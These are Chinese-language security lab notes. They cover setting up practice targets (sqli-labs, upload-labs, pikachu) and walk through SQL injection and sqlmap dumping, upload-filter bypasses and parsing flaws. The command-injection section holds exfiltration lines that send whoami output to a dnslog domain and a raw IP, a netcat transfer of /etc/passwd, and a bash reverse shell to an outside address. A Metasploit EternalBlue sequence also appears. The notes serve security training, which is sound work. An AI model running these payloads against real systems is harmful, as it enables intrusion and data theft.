# 靶场搭建笔记

## 一、小皮面板安装

```
#安装
yum install -y wget && wget -O install.sh https://notdocker.xp.cn/install.sh && sh install.sh
#运行
sudo xp
```

<img src="https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsfvafdmbj306q04rglo.jpg" alt="image-20211227154829039" style="zoom:150%;" />

![image-20211227155849879](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsg620hv0j32220nk43a.jpg)

## 二、spli-labs的配置

> 解压sqli-labs-master压缩文件，并复制到phpStudy根目录下（phpStudy\WWW），为了方便之后联系，可以修改文件夹的名字（sqli）。

![image-20211227155242808](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsfzom7q1j30bd0emglr.jpg)



> 在sqli文件夹中打开sql-connections/db-creds.inc，修改数据库的密码后保存。

![image-20211227155538550](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsg2q2we8j308l011t8i.jpg)

![image-20211227155528480](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsg2k863vj30cq06njrl.jpg)

> 此时sqli-labs的配置就完成了，输入网址（http://172.20.10.3/sqli/），点击[Setup/reset Database for labs](http://127.0.0.1/sqli/sql-connections/setup-db.php)跳转到如下页面就表示已经完成了初始化安装

![image-20211227155946453](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsg7113v1j30bv09tq3m.jpg)

## 三、upload-labs的配置

> 解压upload-labs-0.1压缩文件，并复制到phpStudy根目录下（phpStudy\WWW），为了方便之后联系，可以修改文件夹的名字（upload）。

![image-20211227160331273](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsgaxpct2j30i508aq43.jpg)

> 此时upload-labs的配置就完成了，输入网址（http://127.0.0.1:7577/），跳转到如下页面就表示已经完成了初始化安装。

![image-20211227160507332](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsgcm19tfj31240m377e.jpg)

## 四、 pikachu的配置

> 解压pikachu-master压缩文件，并复制到phpStudy根目录下（/web/pikachu-master）

![image-20211227160701202](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsgekk8jfj30ja09c3z9.jpg)

> 在pikachu文件夹中找到打开inc/config.inc.php，修改数据库的密码后保存。
>
> 此时pikachu的配置就完成了，输入网址（http://127.0.0.1:7575/），页面最上方会出面一个红色的热情提示"欢迎使用,pikachu还没有初始化，点击进行初始化安装!",点击即可完成安装啦！

![image-20211227160758630](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsgfkm2khj30mn0goabv.jpg)



# TOP10漏洞整理

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsghisn9fj30ss0f0t9r.jpg)

### 一、 SQL注入

##### 攻击方式：

利用应用程序弱点，通过恶意字符将恶意代码写入数据库，获取敏感数据或进一步在服务器执行命令。

##### 漏洞原因：

未审计的数据输入框，使用网址直接传递变量，未过滤的特殊字符，SQL 错误回显

### 二、 失效的身份认证

##### 攻击方式：

攻击者利用网站应用程序中的身份认证缺陷获取高权限并进行攻击应用服务

##### 漏洞原因：

应用程序身份认证系统认证缺陷

### 三、 敏感数据泄露

##### 攻击方式：

主要是扫描应用程序获取到敏感数据

##### 漏洞原因：

应用维护或者开发人员无意间上传敏感数据（如 github 文件泄露）、敏感数据文件的权限设置错误（如网站目录下的数据库备份文件泄露）、网络协议、算法本身的弱点（telent、ftp、md5 等）

### 四、 XML外部实体漏洞

##### 攻击方式：

当应用程序解析 XML文件时包含了对外部实体的引用，攻击者传递恶意包含 XML 代码的文件，读取指定的服务器资源。

##### 漏洞原因：

XML 协议文档本身的设计特性，可以引入外部的资源；定义 XML 文件时使用的外部实体引入功能

### 五、 无效的访问控制

##### 攻击方式：

没有检查身份，直接导致攻击者绕过权限直接访问

##### 漏洞原因：

因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就易致越权漏洞。

### 六、 安全配置错误

##### 攻击方式：

攻击者利用错误配置攻击，获取敏感数据或者提升权限

##### 漏洞原因：

开发或者维护人员设置了错误的配置（如 python 开发中对于 Django 框架在生产环境启用了 Debug 模式）

### 七、 目录遍历

##### 攻击方式：

攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件(可以是Web根目录以外的文件)，甚至执行系统命令

##### 漏洞原因：

由于Web服务器或者Web应用程序对用户输入的文件名称的安全性验证不足

### 八、 跨站脚本攻击

##### 攻击方式：

攻击者使用恶意字符嵌入应用程序代码中并运行，盗取应用程序数据

##### 漏洞原因：

应用程序未对应用输入做过滤与检查，导致用户数据被当作代码执行

### 九、 不安全的反序列化漏洞

##### 攻击方式：

攻击者利用应用程序反序列化功能，反序列化恶意对象攻击应用程序

##### 漏洞原因：

应用程序在反序列化数据对象时，执行了攻击者传递的恶意数据对象

### 十、 使用含有已知漏洞的组件

##### 攻击方式：

利用应用程序技术栈中的框架、库、工具等的已知漏洞进行攻击，获取高权限或者敏感数据

##### 漏洞原因：

应用程序技术栈中使用的框架、库、工具爆出了漏洞，应用程序未能及时更新与修复技术漏洞

# SQL注入漏洞

## 一、原理

所谓SQL注入，是指web应用程序对用户输入数据的合理性没有明确判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询具体来说，它是利用现有应用程序，将SQL语句注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入SQL语句得到一个存在安全漏洞的网站上的数据，而不是按照设计者意图去执行SQL语句

## 二、sql常用语句和函数

```
system_user()  			系统用户名
user()         			用户名
current_user   			当前用户名
session_user()  			连接数据库的用户名
database()     			数据库名
version()       			MYSQL数据库版本
load_file()      			转成16进制或者是10进制 MYSQL读取本地文件的函数
@@datadir     			   读取数据库路径
@@basedir     			   MYSQL 安装路径
@@version_compile_os    操作系统

1‘ or 1=1# 			                   来尝试获取全部账号信息
1' union all select 1, 2# 		       来判断可以获取的参数个数
1' union all select 1,(@@version)#	 来获取数据库版本
1' union all select 1,(database())#	 获取数据库名称
1' union all select 1, group_concat(column_name) from information_schema.columns where table_name='users'  #		获取表所有列名

```

## 三、漏洞类型

### 1、字符型注入

#### 1.1判断注入点

```
1' or 1=1 #
```



![image-20211227162301356](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsgv8cz6hj30ce0dxq3z.jpg)

#### 1.2判断可以获取的参数和个数

```
-1' union all select 1,2;#
```

![image-20211227163102303](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsh3ki8otj306r050aa1.jpg)

#### 1.2获取数据库名称

```
-1' union all select 1,database();#
```

![image-20211227163037992](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsh3570tzj30c806eq38.jpg)

#### 1.3查看表

```
-1' union select 1,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)；#
```

![image-20211227163906842](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxshbyy03bj309i07s3yl.jpg)

### 2、sqlmap使用

```
-u 指定目标URL (可以是http协议也可以是https协议)
-d 连接数据库
--dbs 列出所有的数据库
--current-db 列出当前数据库
--tables 列出当前的表
--columns 列出当前的列
-D 选择使用哪个数据库
-T 选择使用哪个表
-C 选择使用哪个列
--dump 获取字段中的数据
--batch 自动选择yes
--smart 启发式快速判断，节约浪费时间
--forms 尝试使用post注入
-r 加载文件中的HTTP请求（本地保存的请求包txt文件）
-l 加载文件中的HTTP请求（本地保存的请求包日志文件）
-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试
-o 开启所有默认性能优化
--tamper 调用脚本进行注入
-v 指定sqlmap的回显等级
--delay 设置多久访问一次
--os-shell 获取主机shell，一般不太好用，因为没权限
--os-cmd 执行命令
-m 批量操作
-c 指定配置文件，会按照该配置文件执行动作
-data data指定的数据会当做post数据提交
-timeout 设定超时时间
-level 设置注入探测等级
--risk 风险等级
--identify-waf 检测防火墙类型
--param-del="分割符" 设置参数的分割符
--skip-urlencode 不进行url编码
--keep-alive 设置持久连接，加快探测速度
--null-connection 检索没有body响应的内容，多用于盲注
--thread 最大为10 设置多线程

```

### 

#### 2.1sqlmap使用练习

http://127.0.0.1:7575/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2

##### 1、检测漏洞

```
sqlmap -u <url>
```

![image-20211227173511861](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsiybdcxkj30ic00x0sr.jpg)

> 存在以下漏洞



![image-20211227173543356](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNgy1gxsiyvg196j30he090jsj.jpg)

##### 2、查看数据库

```
sqlmap -u <url> --dbs 
```

![image-20211227173821158](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNgy1gxsj1n2fhoj30kg01774c.jpg)

> 存在以下数据库

![image-20211227173852106](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNgy1gxsj257wy7j305b05zq2y.jpg)

##### 3、查看数据表

```
sqlmap -u <url> -D <database_name> --tables
```

![image-20211227174117408](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNgy1gxsj4oiop8j30it01eglp.jpg)

> 存在以下数据表

![image-20211227174143655](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNgy1gxsj542xdkj303n04bq2t.jpg)

##### 4、查看数据

```
sqlmap -u <url> -D <database_name> --dump
```



![image-20211227174413779](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNgy1gxsj7qo55aj30wy0hmae7.jpg)



# 命令执行漏洞

## 一、外部通信技巧

### 1、dnslog

```
1、使用反引号whoami得到的用户名再，子域名，再使用 icmp 协议访问 ping 域名
ping -c 4 127.0.0.1| ping `whoami`.smm2m6.dnslog.cn

2、利用日志测试无回显
利用 HTTP 协议，访问 WEB 中间件时，iis 或者 apache 或者小型服务，都存在访问日志。在 vps 上开启 python 的小型服务器。再用 curl 协议访问远程服务器 ip 的 80 端口，再到 vps 的终端查看记录
使用 curl 命令ping -c 4 ||curl http://1.116.203.228/?`whoami`
使用 wget 命令ping -c 4 ||wget http://1.116.203.228/?`whoami`

```

### 2、netcat

> 如果目标系统存在有 netcat 在 linux系统会存在。使用命令读取文件传递到远程服务器上

#### shell

```
目标服务器 
nc -l 80 < /etc/passwd 
本机执行命令 
nc 1.116.203.228 80 > passwd
```



#### 反弹shell

```
反弹shell
本机监听
nc -lvnp 1234
受害主机
bash -i >& /dev/tcp/124.223.192.250/1233 0>&1
```

##### 演示

###### 主机 监听1234端口

![image-20211227175503202](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNgy1gxsjizvkdkj30me022glt.jpg)

###### 受害主机 发送bash去 主机 1234端口

![image-20211227175543708](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNgy1gxsjjqyu8hj30mw022q36.jpg)

###### 结果

![image-20211227175651322](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNgy1gxsjkvjlalj30n406ojrq.jpg)

# 解析漏洞

## 一、简介

> 解析漏洞指的是服务器应用程序在解析某些精心构造的后缀文件时，会将其解析成网页脚本，从而导致网站的沦陷。
>
> 大部分解析漏洞的产生都是由应用程序本身的漏洞导致的。
> 简单的说就是将其他类型的文件解析成脚本语言。
>
> ![image-20211227185808388](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxslctc96lj30n40codgy.jpg)

## 二、IIS5.x-7.x解析漏洞

> 使用 IIS5.x-6.x 版本的服务器，大多为Windows server 2003，网站比较古老，开发语句一般为asp；
> 该解析漏洞也只能解析asp文件，不能解析aspx文件。



### 1、iis 6.x 文件夹：

>  IIS6.0中的目录解析漏洞，如果网站目录中有一个 *.asp/ 的文件夹，那么该文件夹下面的一切内容都会被 IIS 当作 asp 脚本来执行，如：
>
> /xx.asp/xx.jpg
>  image/qq.jpg
>  image.asp/qq.jpg qq.jpg 
>
> 就会被当成asp解析。

### 2、IIS6.0 文件：

> IS6.0中的分号（;）漏洞，IIS在解析文件名的时候会将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如：
>
> a.asp;jpg。
> image.jpg
> image.asp;jpg 
>
> xxx.asp;xxx.jpg 
>
> 此文件会被当成asp执行。
>
> asp 可以换做php ，如果换了php那么就当php执行。
>  IIS6.0 默认的可执行文件除了asp还包含这三种 :
>   /test.asa
>   /test.cer
>   /test.cdx

### 3、IIS 7.0/IIS 7.5 /Nginx < 8.03急性解析漏洞：

> IIS 7.0/7.5，默认 Fast-CGI 开启。
> 如果直接在 url 中图片地址（.jpg）后面输入/.php，会把正常图片解析为 php 文件。
>
> 在某些使用Nginx的网站中，访问 http://www.xxser.com/1.jpg/1.php，1.jpg 会被当作PHP脚本来解析，此时 1.php 是不存在的。
>
> 这就意味着攻击者可以上传合法的“图片”（图片木马），然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。这不是Nginx特有的漏洞，在IIS7.0、IIS7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。
>
> 这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo配置文件中，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。

## 三、Apache解析漏洞

### 1、Apache （1.x,2.x）版本

#### 1.1解析文件的原则

> Apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar、gif等扩展名是Apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的。
> 假如上传文件1.php.bb.rar，后缀名rar不认识，向前解析；1.php.bb，后缀名bb不认识，向前解析；1.php 最终解析结果为php文件。
> 如果解析完还没有碰到可以解析的扩展名，就会暴露源文件。
> 这种方法可以绕过基于黑名单的检查。（如网站限制,不允许上传后缀名为php的文件）

#### 1.2多后缀解析漏洞

> 解释
> 比如说文件后缀名为：x.php.xxx.yyy
> 识别最后的yyy ,如果不识别的话，就向前解析，直到识别。yyy --> xxx --> php 
> 利用场景：
> 前提：对方支持上传一个自定义的后缀（未知名的文件类型）。
> 如果对方中间件apche属于低版本，我们可以利用文件上传，上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，其中的后门代码被触发。

![image-20211227193022739](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsma6lfmcj30n40cajs5.jpg)

![image-20211227193030380](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsmab47x1j30n40d0dh3.jpg)

![image-20211227193038463](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsmag5r0gj30ng0aw0tp.jpg)

#### 1.3Apache 换行解析

> 此漏洞的出现是由于 Apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照php 后缀进行解析，导致绕过一些服务器的安全策略。
>  上传一个php文件。注意，只能是\x0A，用hex功能在1.php后面添加一个\x0A

![image-20211227193200096](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsmbvkwltj30n40eswg3.jpg)

![image-20211227193207375](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsmc0kltij30n40hgdis.jpg)



# 文件上传

## Pass-01（JS绕过）

![image-20211227201848224](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnokcie5j30vd0l5767.jpg)

抓包改名

![image-20211227202101180](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnqvixvhj30vw0u0n3o.jpg)



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnkzd528j313o0qm7bp.jpg)

 

## Pass-02（绕type类型）

绕过 contnet-type 检测上传

有些上传模块，会对 http 的类型头进行检测，如果是图片类型，允许上传文件到服务器，否则返回上传失败。因为服务端是通过 content-type 判断类型，content-type 在客户端可被修改。则此文件上传也有可能被绕过的风险。

上传文件,脚本文件，抓包把 content-type 修改成 image/jpeg 即可绕过上传。

 

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnl1v9alj30sp0ig414.jpg)

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnky5a3dj314x0sfafr.jpg)

 

## Pass-03（绕黑名单）

绕过黑名单上传

上传模块，有时候会写成黑名单限制，在上传文件的时获取后缀名，再把后缀名与程序中黑名单进行检测，如果后缀名在黑名单的列表内，文件将禁止文件上传。

上传图片时，如果提示不允许 php、asp 这种信息提示，可判断为黑名单限制，上传黑名单以外的后缀名即可。
 在 iis 里 asp 禁止上传了，可以上传 asa cer cdx 这些后缀，如在网站里允许.net 执行 可以上传 ashx 代替 aspx。如果网站可以执行这些脚本，通过上传后门即可获取 webshell。
 在不同的中间件中有特殊的情况，如果在 apache 可以开启 application/x-httpd-php 在 AddType application/x-httpd-php .php .phtml .php3 后缀名为 phtml 、php3 均被解析成 php 有的 apache 版本默认就会开启。上传目标中间件可支持的环境的语言脚本即可，如.phtml、php3。

 

 

## Pass-04（htaccess 重写解析绕过）

 

上传模块，黑名单过滤了所有的能执行的后缀名,如果允许上传.htaccess。htaccess 文件的作用是 可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP 地址的用户、只允许特定 IP 地址的用户、禁止目录列表，以及使用其他文件作为 index 文件等一些功能。
 在 htaccess 里写入 SetHandler application/x-httpd-php 则可以文件重写成 php 文件。要 htaccess 的规则生效 则需要在 apache 开启 rewrite 重写模块，因为 apache 是多数都开启这个模块，所以规则一般都生效

 

上传.htaccess 到网站里.htaccess 内容是

```
<FilesMatch "jpg">
 SetHandler application/x-httpd-php
 </FilesMatch>
```

 再上传恶意的 jpg 到.htaccess 相同目录里，访问图片即可获取执行脚本。

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnkwctydj310g0qdq8d.jpg)

 

## Pass-05（大小写绕过）

有的上传模块 后缀名采用黑名单判断，但是没有对后缀名的大小写进行严格判断，导致可以更改后缀大小写可以被绕过。如 PHP、 Php、 phP、pHp

 

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnkuwovfj30mp0hsq42.jpg)

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnktyb1gj310z0shafq.jpg)

 

## Pass-06（空格绕过）

在上传模块里，采用黑名单上传，如果没有对空格进行去掉可能被绕过。
 抓包上传，在后缀名后添加空格

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnkvdb7mj30qb0a5ab9.jpg)

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnkth69dj31270nuq7x.jpg)

 

## Pass-07（windows 系统特征）

在 windows 中文件后缀名. 系统会自动忽略.所以 shell.php. 像 shell.php 的效果一样。所以可以在文件 名后面机上.绕过
 抓包修改在后缀名后加上.即可绕过。



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnl0h58nj30ng0bpdh4.jpg)

 

 

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnl4cczaj30yx0jr0wq.jpg)

 

## Pass-08（NTFS 交换数据流::$DATA）

如果后缀名没有对::$DATA 进行判断，利用 windows 系统 NTFS 特征可以绕过上传。
 burpsuite 抓包，修改后缀名为 php::$DATA

 

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnkx7okdj30ol0cjq4p.jpg)

 

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnl3sajyj30wy0jc77t.jpg)

 

## Pass-09（叠加特征绕过）

在 windwos 中如果上传文件名 test.php:.jpg 的时候，会在目录下生产空白的文件名 test.php
 再利用 php 和 windows 环境的叠加属性，


 以下符号在正则匹配时相等
 双引号" 等于 点号. 大于符号> 等于 问号?
 小于符号< 等于 星号*
 文件名.<或文件名.<<<或文件名.>>>或文件名.>><空文件名

首先抓包上传 a.php:.php 上传会在目录里生成 a.php 空白文件，接着再a.php 改成 a.>>>

 

 

## Pass-10（双写后缀名绕过上传）

在上传模块，有的代码会把黑名单的后缀名替换成空，例如 a.php 会把 php 替换成空，但是可以使用双写
 绕过例如 asaspp，pphphp，即可绕过上传
 抓包上传，把后缀名改成 pphphp 即可绕过

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnl6lfcmj30ky0cymxu.jpg)

![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnksvnymj30x20in0w5.jpg)

 

 

## Pass-11（目录可控%00 截断绕过）

使用白名单验证会相对比较安全，因为只允许指定的文件后缀名。但是如果有可控的参数目录，也存在被绕过的风险.
 代码中使用白名单限制上传的文件后缀名，只允许指定的图片格式。但是$_GET['save_path']服务器接受客户端的值，这个值可被客户端修改。所以会留下安全问题

上传参数可控
 当 gpc 关闭的情况下，可以用%00 对目录或者文件名进行截断。
 php 版本小于 5.3.4
 首先截断攻击，抓包上传将%00 自动截断后门内容。
 例如 1.php%00.1.jpg 变成 1.php

 

 

## Pass-12（二次渲染）

有些图片上传，会对上传的图片进行二次渲染后在保存，体积可能会更小，图片会模糊一些，但是符合网站的需求。例如新闻图片封面等可能需要二次渲染，因为原图片占用的体积更大。访问的人数太多时候会占用，很大带宽。二次渲染后的图片内容会减少，如果里面包含后门代码，可能会被省略。导致上传的图片马，恶意代码被清除

首先判断图片是否允许上传 gif，gif 图片在二次渲染后，与原图片差别不会太大。所以二次渲染攻击最好用 git 图片马

 制作图片马
 将原图片上传，下载渲染后的图片进行对比，找相同处，覆盖字符串，填写一句话后门，或者恶意指令。
 原图片与渲染后的图片这个位置的字符串没有改变所在原图片这里替换成<? php phpinfo();?>直接上传即可

# 提权漏洞

## 一、MS17-010 永恒之蓝

```
#进入msf
msfconsole

#数据库搜索ms17-010
search ms17-010

#进入漏洞
use windows/smb/ms17_010_eternalblue

#设置被攻击者的ip
set rhosts 192.168.5.59

#运行
run

#解决乱码
chcp 65001

```

 

![image-20211227202332209](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsnti5lauj30s00bcjt8.jpg)

![image-20211227202338515](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gxsntn8vjqj30sm0d0tc3.jpg)







